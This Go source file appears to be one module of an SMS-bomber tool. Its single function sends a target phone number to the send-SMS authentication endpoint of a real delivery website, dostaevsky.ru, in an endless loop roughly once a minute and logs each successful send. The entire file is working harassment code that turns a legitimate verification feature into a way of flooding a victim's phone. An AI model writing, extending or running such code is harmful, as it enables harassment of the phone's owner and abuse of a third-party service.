package main

import (
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

func dostaevsky() {
	req := newreq()
	req.SetBodyString("phone=" + num[0:1] + "%20" + num[1:4] + "%20" + num[4:7] + "-" + num[7:9] + "-" + num[9:])
	req.SetRequestURI("https://dostaevsky.ru/auth/send-sms")
	req.Header.SetMethod("POST")

	timeout := time.Minute*1 + time.Second*2
	if logging > 0 {
		var err error
		res := &fasthttp.Response{}

		for do {
			err = client.Do(req, res)

			if err == nil && strings.Index(string(res.Body()), `"success":true`) != -1 {
				okLog(smsLog)
			} else {
				errLog(smsLog)
			}
			time.Sleep(timeout)
		}
	} else {
		for do {
			client.Do(req, nil)
			time.Sleep(timeout)
		}
	}
}
